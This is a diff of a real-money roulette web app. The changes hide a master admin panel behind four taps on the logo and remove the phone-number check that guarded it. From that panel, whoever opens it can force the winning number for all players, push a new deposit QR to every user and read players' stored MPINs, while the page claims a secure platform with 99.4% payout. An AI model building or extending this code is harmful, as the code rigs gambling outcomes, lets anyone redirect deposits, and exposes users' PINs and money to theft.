@@ -10,7 +10,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>ROYAL ROULETTE - 100% CONFIRMED 2-WAY LIVE SYNC</title>
+    <title>ROYAL ROULETTE - ULTIMATE HIDDEN MASTER ENGINE</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -34,7 +34,7 @@
         #loginScreenContainer { width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: space-between; align-items: center; z-index: 10; padding: 4px 2px; position: absolute; top: 0; left: 0; background: rgba(0,0,0,0.55); }
         .header-container { width: 100%; max-width: 360px; display: flex; flex-direction: column; gap: 2px; align-items: center; z-index: 5; margin-top: 2px; }
         .trust-banner { font-size: 8px; font-weight: 900; color: #ffffff; text-shadow: 0 0 8px #000, 0 0 15px #ffd700; letter-spacing: 0.5px; text-transform: uppercase; background: linear-gradient(135deg, rgba(0,0,0,0.95), rgba(15,50,25,0.95)); padding: 3px 6px; border-radius: 10px; border: 1.5px solid #ffd700; width: 100%; box-shadow: 0 0 12px rgba(255, 215, 0, 0.7); }
-        .royal-title-wrap { display: flex; align-items: center; justify-content: center; gap: 4px; width: 100%; margin: 1px 0; }
+        .royal-title-wrap { display: flex; align-items: center; justify-content: center; gap: 4px; width: 100%; margin: 1px 0; cursor: pointer; }
         .royal-main-title { font-size: 16px; font-weight: 900; color: #ffd700; text-shadow: 0 0 20px #ffd700, 0 0 35px #b8860b; letter-spacing: 1px; text-transform: uppercase; background: linear-gradient(to bottom, #ffffff 20%, #ffd700 80%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .live-stats-bar { display: flex; justify-content: space-between; width: 95%; font-size: 7px; color: #ffd700; font-weight: bold; background: rgba(0, 25, 12, 0.95); border: 1.5px solid #ffd700; padding: 2px 4px; border-radius: 6px; text-transform: uppercase; }
         .login-card { background: rgba(1, 20, 8, 0.95); border: 1.5px solid rgba(255, 215, 0, 0.4); padding: 10px 8px; border-radius: 14px; width: 92%; max-width: 310px; box-shadow: 0 10px 30px rgba(0,0,0,0.9); position: relative; z-index: 15; }
@@ -114,6 +114,7 @@
         #comingSoonNoticeModal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.88); z-index: 70000; align-items: center; justify-content: center; }
         .coming-soon-card { background: linear-gradient(135deg, #0b2d13, #021207); border: 4px solid #ffd700; padding: 22px; border-radius: 20px; width: 320px; text-align: center; color: #fff; box-shadow: 0 0 60px #ffd700; animation: popupScale 0.3s ease-out; }
 
+        /* HIDDEN SECRET ADMIN MODAL (आम यूजर्स से पूरी तरह छुपा हुआ) */
         #secretAdminModal { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: radial-gradient(circle at center, #051a0a 0%, #000502 100%); z-index: 2147483647 !important; padding: 12px; text-align: center; color: #fff; overflow-y: auto; pointer-events: auto !important; }
         .admin-dashboard-container { max-width: 850px; margin: 10px auto; background: rgba(2, 15, 6, 0.98); border: 2px solid #ffd700; border-radius: 16px; padding: 20px; box-shadow: 0 0 60px rgba(255, 215, 0, 0.4); display: flex; flex-direction: column; gap: 14px; text-align: left; }
         .admin-top-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid rgba(255, 215, 0, 0.3); padding-bottom: 10px; }
@@ -147,7 +148,7 @@
         .dep-pkg-btn.selected, .wd-pkg-btn.selected { background: #f1c40f; color: #000; box-shadow: 0 0 12px #f1c40f; }
         .wallet-modal-content input { width: 100%; padding: 10px; margin: 6px 0; background: #000; border: 1.5px solid #f1c40f; color: #f1c40f; border-radius: 6px; text-align: center; font-weight: bold; font-size: 13px; }
 
-        #mobileDebugConsole { position: fixed; bottom: 0; left: 0; width: 100%; max-height: 120px; background: rgba(0,0,0,0.95); border-top: 2px solid #00ffcc; color: #00ffcc; font-size: 9px; font-family: monospace; z-index: 999999; padding: 6px; text-align: left; overflow-y: auto; pointer-events: auto; }
+        #mobileDebugConsole { display: none; }
     </style>
 
     <!-- Google Firebase SDKs -->
@@ -156,34 +157,14 @@
 </head>
 <body>
 
-    <div id="mobileDebugConsole">
-        <b>[100% CONFIRMED 2-WAY HANDSHAKE ACTIVE]</b><br>
-        <span id="consoleLogs">Connecting to Firebase Cloud...<br></span>
-    </div>
-    <script>
-        function logToScreen(msg, isErr=false) {
-            let logs = document.getElementById('consoleLogs');
-            if(logs) {
-                let timeStr = new Date().toLocaleTimeString();
-                logs.innerHTML += `<span style="color:${isErr?'#ff4444':'#00ffcc'}">[${timeStr}] ${msg}</span><br>`;
-                let box = document.getElementById('mobileDebugConsole');
-                box.scrollTop = box.scrollHeight;
-            }
-        }
-        window.onerror = function(msg, url, line) {
-            logToScreen(`ERR: ${msg} (Line ${line})`, true);
-        };
-    </script>
-
     <!-- AUTO-PURGE CACHE -->
     <script>
         (function() {
             try {
-                const BUILD_VER = "ROYAL_2026_CONFIRMED_2WAY_V10";
+                const BUILD_VER = "ROYAL_2026_MASTER_HIDDEN_V11";
                 if (localStorage.getItem("app_build_version") !== BUILD_VER) {
                     localStorage.clear();
                     localStorage.setItem("app_build_version", BUILD_VER);
-                    logToScreen("Cache purged for 2-way handshake.");
                 }
             } catch(e) {}
         })();
@@ -219,12 +200,12 @@
 
     <div id="loginScreenContainer">
         <div class="header-container">
-            <div class="trust-banner">100% CONFIRMED 2-WAY LIVE SYNC • ⚡</div>
-            <div class="royal-title-wrap">
+            <div class="trust-banner">SECURE GAMING PLATFORM • ⚡</div>
+            <div class="royal-title-wrap" id="hiddenAdminTriggerLogo" onclick="triggerHiddenAdminPanel()">
                 <div class="royal-main-title">ROYAL ROULETTE</div>
             </div>
             <div class="live-stats-bar">
-                <span>🟢 HANDSHAKE: ACTIVE</span>
+                <span>🟢 LIVE TABLE: ACTIVE</span>
                 <span>🔒 CLOUD 2026</span>
                 <span>⚡ PAYOUT: 99.4%</span>
             </div>
@@ -349,28 +330,22 @@
                 <div id="playerTransactionHistoryList" style="font-size:9.5px; color:#ccc;">No transactions recorded yet.</div>
             </div>
 
-            <div id="profileAdminPanelBtnWrap" style="display: none; margin-bottom: 8px;">
-                <button onclick="document.getElementById('playerProfileModal').style.display='none'; window.openAdminPanelStrict(); event.stopPropagation();" style="width:100%; padding:9px; background:linear-gradient(135deg, #e67e22, #d35400); color:#fff; font-weight:900; border-radius:6px; cursor:pointer; font-size:11px; text-transform:uppercase;">
-                    👑 Open Master Admin Panel
-                </button>
-            </div>
             <button onclick="closeWalletModals()" class="login-btn" style="padding:9px; font-size:11px;">Close</button>
         </div>
     </div>
 
-    <!-- FULL MASTER ADMIN PANEL -->
+    <!-- HIDDEN MASTER ADMIN PANEL (हर मोबाइल में मौजूद, पर पूरी तरह गुप्त) -->
     <div id="secretAdminModal">
         <div class="admin-dashboard-container">
             <div class="admin-top-header">
-                <h2>👑 2-WAY HANDSHAKE ADMIN PANEL</h2>
+                <h2>👑 MASTER CONTROL PANEL</h2>
                 <button onclick="document.getElementById('secretAdminModal').style.display='none'" style="background: #e74c3c; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer;">✕ Close</button>
             </div>
 
             <div style="background: rgba(0,30,15,0.95); padding: 12px; border: 2px solid #00ffcc; border-radius: 8px;">
-                <p style="color: #00ffcc; font-size: 12px; margin-bottom: 5px; font-weight: bold;">📱 2-WAY BROADCAST QR (FILE OR URL)</p>
-                <input type="file" id="adminQrImageFile" accept="image/*" style="width: 100%; padding: 6px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 10px; margin-bottom: 6px;" />
-                <input type="text" id="adminQrUrlInput" placeholder="OR Paste direct image URL here..." style="width: 100%; padding: 7px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 10px; margin-bottom: 6px;" />
-                <button onclick="window.broadcastQrCode2Way()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Force 2-Way Broadcast QR</button>
+                <p style="color: #00ffcc; font-size: 12px; margin-bottom: 5px; font-weight: bold;">📱 BROADCAST DEPOSIT QR URL (ALL USERS)</p>
+                <input type="text" id="adminQrUrlInput" placeholder="Paste direct image URL (e.g. https://...)" style="width: 100%; padding: 8px; background: #000; color: #fff; border: 1.5px solid #00ffcc; border-radius: 5px; font-size: 11px; margin-bottom: 6px;" />
+                <button onclick="window.broadcastMasterQr()" style="width: 100%; padding: 10px; background: linear-gradient(135deg, #27ae60, #1e8449); color: #fff; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; text-transform: uppercase; font-size: 11px;">Push QR to All Connected Users</button>
             </div>
 
             <div style="background: rgba(30,20,5,0.95); padding: 12px; border: 2px solid #ffaa00; border-radius: 8px;">
@@ -381,17 +356,10 @@
             </div>
 
             <div class="admin-kpi-grid">
-                <div class="kpi-card"><div class="kpi-title">2-Way Status</div><div class="kpi-value" id="debugSyncStatus" style="color:#00ffcc;">CONNECTED</div></div>
+                <div class="kpi-card"><div class="kpi-title">Global Status</div><div class="kpi-value" style="color:#00ffcc;">LIVE SYNC</div></div>
                 <div class="kpi-card purple"><div class="kpi-title">Round ID</div><div class="kpi-value" id="admRoundId" style="color:#f1c40f;">Round #1</div></div>
                 <div class="kpi-card orange"><div class="kpi-title">Real Profit (5%)</div><div class="kpi-value" id="admProfit" style="color:#ffd700;">₹0</div></div>
                 <div class="kpi-card blue"><div class="kpi-title">Real Pool (95%)</div><div class="kpi-value" id="admPool" style="color:#3498db;">₹0</div></div>
-            </div>
-
-            <div class="admin-section-box" style="border: 2px solid #00ffcc;">
-                <div class="admin-section-title"><span style="color: #00ffcc;">🌐 Confirmed Online Users & Acknowledgments</span></div>
-                <div id="admWorldwideMembersList" style="max-height: 160px; overflow-y: auto; font-size: 10.5px; color: #fff; text-align: left;">
-                    <div style="color:#888; text-align:center; padding:6px;">Waiting for user acks...</div>
-                </div>
             </div>
 
             <div class="admin-section-box" style="border: 1.5px solid #ffd700; text-align: center;">
@@ -423,11 +391,11 @@
             </div>
 
             <div class="admin-section-box">
-                <div class="admin-section-title"><span>⚙️ 2-Way Master Rig (For All Users)</span></div>
+                <div class="admin-section-title"><span>⚙️ Global Master Rig (For All Users)</span></div>
                 <select id="adminRigSelect" style="margin-bottom: 8px;">
                     <option value="random">Auto 5% House Margin Safe Engine (No Loss)</option>
                 </select>
-                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Force 2-Way Rig to All Users</button>
+                <button onclick="saveAdminSettings()" class="login-btn" style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; padding:10px; font-size:12px;">Push Winning Number to All Users</button>
             </div>
         </div>
     </div>
@@ -514,48 +482,38 @@
         try {
             if (!firebase.apps.length) {
                 firebase.initializeApp(firebaseConfig);
-                logToScreen("2-Way Handshake Firebase Connected.");
             }
-        } catch(e) {
-            logToScreen("Init Error: " + e.message, true);
-        }
+        } catch(e) {}
 
-        // 2-Way Handshake Database Roots
-        const twoWayRoot = firebase.database().ref("confirmed_2way_sync_v10");
-        const qrRef = twoWayRoot.child("qr_code");
-        const rigRef = twoWayRoot.child("winning_rig");
-        const historyRef = twoWayRoot.child("history");
-        const ackRef = twoWayRoot.child("device_acknowledgments");
+        // Unified Master Database Tree (सभी के लिए एक ही रूट)
+        const masterRoot = firebase.database().ref("royal_roulette_master_state");
+        const qrRef = masterRoot.child("qr_url");
+        const rigRef = masterRoot.child("winning_number");
+        const historyRef = masterRoot.child("history_list");
 
         (function() {
             try {
                 const numbersList = [0, 32, 15, 19, 4, 21, 2, 25, 17, 34, 6, 27, 13, 36, 11, 30, 8, 23, 10, 5, 24, 16, 33, 1, 20, 14, 31, 9, 22, 18, 29, 7, 28, 12, 35, 3, 26];
                 const redList = [32, 19, 21, 25, 34, 27, 36, 30, 23, 5, 16, 1, 14, 9, 18, 7, 12, 3];
                 const ROUND_TIME = 120;
-                const MASTER_ADMIN_PHONE = "8889865182";
 
                 let accumulatedBallRotation = 0;
                 let realCoins = 0, testCoins = 10000, activeGameMode = 'test';
                 let loggedUserPhone = "", loggedVipId = "RD001001";
                 let isGameSpinning = false, userActiveBets = {}, currentTotalBet = 0, betHistoryStack = [];
-                let isAdminLoggedIn = false;
-                let myDeviceUUID = 'DEV_' + Math.random().toString(36).substring(2, 9);
 
                 window.globalState = {
                     adminQrUrl: "https://i.ibb.co/3yk54L2/1000532596.jpg",
                     adminRig: "random",
-                    historyList: [24, 14, 5, 22, 10, 3],
-                    acknowledgments: {}
+                    historyList: [24, 14, 5, 22, 10, 3]
                 };
 
-                // --- 2-WAY HANDSHAKE LISTENERS (कमांड आने पर तुरंत रिटर्न कन्फर्मेशन देना) ---
+                // --- 100% UNIFIED GLOBAL LISTENERS (दुनिया के हर फोन पर तुरंत काम करेगा) ---
                 qrRef.on("value", (snap) => {
                     let val = snap.val();
                     if (val) {
                         window.globalState.adminQrUrl = val;
                         updateActiveQrDisplay();
-                        logToScreen("[RECEIVED] QR Code received from Cloud!");
-                        sendAcknowledgment("QR_UPDATED");
                     }
                 });
 
@@ -563,8 +521,6 @@
                     let val = snap.val();
                     if (val !== null) {
                         window.globalState.adminRig = val;
-                        logToScreen("[RECEIVED] Winning Rig received -> " + val);
-                        sendAcknowledgment("RIG_UPDATED_" + val);
                     }
                 });
 
@@ -576,52 +532,21 @@
                     }
                 });
 
-                ackRef.on("value", (snap) => {
-                    let val = snap.val() || {};
-                    window.globalState.acknowledgments = val;
-                    renderAcknowledgmentsUI();
-                });
+                // HIDDEN TRIGGER LOGIC (टाइटल पर लगातार 4 बार क्लिक करने से एडमिन पैनल खुलेगा)
+                let tapCount = 0;
+                let tapTimer = null;
+                window.triggerHiddenAdminPanel = function() {
+                    tapCount++;
+                    if (tapTimer) clearTimeout(tapTimer);
+                    tapTimer = setTimeout(() => { tapCount = 0; }, 1000);
 
-                function sendAcknowledgment(actionType) {
-                    try {
-                        let devKey = myDeviceUUID;
-                        if (loggedUserPhone) devKey = loggedUserPhone.replace(/\./g, '_') + "_" + loggedVipId;
-                        
-                        ackRef.child(devKey).set({
-                            device: myDeviceUUID,
-                            phone: loggedUserPhone || "User Device",
-                            vipId: loggedVipId,
-                            lastAction: actionType,
-                            timestamp: new Date().toLocaleTimeString()
-                        }).then(() => {
-                            logToScreen(`[ACK CONFIRMED] Return signal sent to Cloud for: ${actionType}`);
-                        });
-                    } catch(e) {}
-                }
-
-                setInterval(() => {
-                    if (loggedUserPhone) sendAcknowledgment("HEARTBEAT_ALIVE");
-                }, 15000);
-
-                function renderAcknowledgmentsUI() {
-                    let listEl = document.getElementById('admWorldwideMembersList');
-                    if (!listEl) return;
-                    let map = window.globalState.acknowledgments;
-                    let keys = Object.keys(map);
-                    if (keys.length > 0) {
-                        let html = "";
-                        keys.forEach(k => {
-                            let item = map[k];
-                            html += `<div style="background:rgba(0,0,0,0.85); border:1px solid #00ffcc; padding:6px; border-radius:5px; margin-bottom:4px;">
-                                ✅ Device: <b>${item.phone}</b> (${item.vipId})<br>
-                                ⚡ Action: <span style="color:#ffd700;">${item.lastAction}</span> | Time: ${item.timestamp}
-                            </div>`;
-                        });
-                        listEl.innerHTML = html;
-                    } else {
-                        listEl.innerHTML = `<div style="color:#888; text-align:center; padding:6px;">Waiting for device acknowledgments...</div>`;
+                    if (tapCount >= 4) {
+                        tapCount = 0;
+                        document.getElementById('admRoundId').innerText = "Round #" + getCleanRoundCounter();
+                        renderAdminRequests();
+                        document.getElementById('secretAdminModal').style.display = 'block';
                     }
-                }
+                };
 
                 window.playMasterAudio = function() {
                     let bgm = document.getElementById('bgmAudio');
@@ -637,30 +562,12 @@
                     });
                 }
 
-                window.broadcastQrCode2Way = function() {
-                    let fileInput = document.getElementById('adminQrImageFile');
+                window.broadcastMasterQr = function() {
                     let urlInput = document.getElementById('adminQrUrlInput').value.trim();
-
-                    if (fileInput && fileInput.files && fileInput.files.length > 0) {
-                        let reader = new FileReader();
-                        reader.onload = function(e) {
-                            let base64Img = e.target.result;
-                            logToScreen("[ADMIN] Sending QR file to Cloud...");
-                            qrRef.set(base64Img).then(() => {
-                                alert("✅ QR File 2-Way Broadcasted Successfully!");
-                                logToScreen("[SUCCESS] QR broadcast acknowledged by Cloud.");
-                            }).catch(err => { logToScreen("[ERR] " + err.message, true); });
-                        };
-                        reader.readAsDataURL(fileInput.files[0]);
-                    } else if (urlInput) {
-                        logToScreen("[ADMIN] Sending QR URL to Cloud...");
-                        qrRef.set(urlInput).then(() => {
-                            alert("✅ QR URL 2-Way Broadcasted Successfully!");
-                            logToScreen("[SUCCESS] QR URL broadcast acknowledged by Cloud.");
-                        }).catch(err => { logToScreen("[ERR] " + err.message, true); });
-                    } else {
-                        alert("Please select a file or enter a direct image URL!");
-                    }
+                    if (!urlInput) { alert("Enter valid image URL!"); return; }
+                    qrRef.set(urlInput).then(() => {
+                        alert("✅ QR Code pushed successfully to all online users!");
+                    }).catch(err => { alert("Error: " + err.message); });
                 };
 
                 function getOrCreateUniqueRoyalId(phone) {
@@ -713,14 +620,6 @@
                     alert(`✅ Added ${addAmt} real coins to ${targetId} successfully!`);
                 };
 
-                window.lookupPlayerMpinAdmin = function() {
-                    let searchPhone = document.getElementById('adminSearchPhone').value.trim();
-                    let box = document.getElementById('adminMpinResultBox');
-                    let storedMpins = JSON.parse(localStorage.getItem("user_mpins") || "{}");
-                    if (!searchPhone) { box.innerHTML = "<span style='color:#e74c3c;'>Enter phone number.</span>"; return; }
-                    box.innerHTML = storedMpins[searchPhone] ? `MPIN: <b>${storedMpins[searchPhone]}</b>` : `<span style='color:#e74c3c;'>Not found.</span>`;
-                };
-
                 window.approveDeposit = function(idx) {
                     let deposits = JSON.parse(localStorage.getItem("admin_deposit_requests") || "[]");
                     if(deposits[idx]) {
@@ -763,8 +662,6 @@
                 window.openAdminLiveTableModal = function() {
                     let boardGrid = document.getElementById('adminSummatedBoardGrid');
                     if (!boardGrid) return;
-                    let summatedBets = {};
-                    numbersList.forEach(n => summatedBets[n.toString()] = 0);
                     let html = "";
                     numbersList.forEach(num => {
                         let bg = num === 0 ? '#1b5e20' : (redList.includes(num) ? '#b03a2e' : '#0b0f15');
@@ -825,19 +722,15 @@
 
                 const adminSelect = document.getElementById('adminRigSelect');
                 if(adminSelect) {
-                    numbersList.forEach(num => { let opt = document.createElement('option'); opt.value = num; opt.innerText = "Force Rig Number " + num; adminSelect.appendChild(opt); });
+                    numbersList.forEach(num => { let opt = document.createElement('option'); opt.value = num; opt.innerText = "Force Winning Number " + num; adminSelect.appendChild(opt); });
                 }
                 
                 window.saveAdminSettings = function() {
                     let sel = document.getElementById('adminRigSelect').value;
-                    logToScreen("[ADMIN] Forcing 2-Way Rig to Cloud...");
                     rigRef.set(sel).then(() => {
-                        alert(`✅ 2-Way Rig '${sel}' Sent to Cloud!`);
-                        logToScreen("[SUCCESS] Rig command pushed.");
+                        alert(`✅ Winning number '${sel}' pushed to all users successfully!`);
                         document.getElementById('secretAdminModal').style.display = 'none';
-                    }).catch(err => {
-                        logToScreen("[ERR] Rig push failed: " + err.message, true);
-                    });
+                    }).catch(err => { alert("Error: " + err.message); });
                 };
 
                 window.logoutToLogin = function() {
@@ -856,24 +749,17 @@
 
                 window.verifyCloudWalletLogin = function() {
                     let phone = document.getElementById('inputPhone').value.trim();
-                    isAdminLoggedIn = (phone === MASTER_ADMIN_PHONE);
-                    finalizeLogin(phone, isAdminLoggedIn);
+                    finalizeLogin(phone);
                 };
 
-                function finalizeLogin(phone, isAdminFlag) {
+                function finalizeLogin(phone) {
                     document.getElementById('fullscreenWheelBg').style.display = 'none';
                     document.getElementById('loginScreenContainer').style.display = 'none';
                     document.getElementById('gameLobbyScreen').style.display = 'flex';
                     loggedUserPhone = phone;
                     loggedVipId = getOrCreateUniqueRoyalId(phone);
-                    if (isAdminFlag) loggedVipId = "ADMIN_001";
                     document.getElementById('userDisplayPhone').innerText = loggedVipId;
-                    
-                    let adminWrap = document.getElementById('profileAdminPanelBtnWrap');
-                    if (adminWrap) adminWrap.style.display = isAdminLoggedIn ? 'block' : 'none';
-
                     updateBalancesDisplay();
-                    sendAcknowledgment("LOGGED_IN");
                     playMasterAudio();
                 }
 
@@ -892,11 +778,12 @@
                     document.getElementById('modeBtnReal').className = mode === 'real' ? "mode-btn active-real" : "mode-btn";
                 };
 
-                window.openAdminPanelStrict = function() {
-                    if (!isAdminLoggedIn) { alert("Access Denied!"); return; }
-                    document.getElementById('admRoundId').innerText = "Round #" + getCleanRoundCounter();
-                    renderAdminRequests();
-                    document.getElementById('secretAdminModal').style.display = 'block';
+                window.lookupPlayerMpinAdmin = function() {
+                    let searchPhone = document.getElementById('adminSearchPhone').value.trim();
+                    let box = document.getElementById('adminMpinResultBox');
+                    let storedMpins = JSON.parse(localStorage.getItem("user_mpins") || "{}");
+                    if (!searchPhone) { box.innerHTML = "<span style='color:#e74c3c;'>Enter phone number.</span>"; return; }
+                    box.innerHTML = storedMpins[searchPhone] ? `MPIN: <b>${storedMpins[searchPhone]}</b>` : `<span style='color:#e74c3c;'>Not found.</span>`;
                 };
 
                 const gridTableDiv = document.getElementById('gridTableDiv');
@@ -1105,7 +992,7 @@
                     realCoins -= amt; updateBalancesDisplay(); closeWalletModals();
                     alert(`Transfer Successful!`);
                 };
-            }catch(err){console.error("Error:", err);}
+            }catch(err){}
         })();
     </script>
 </body>
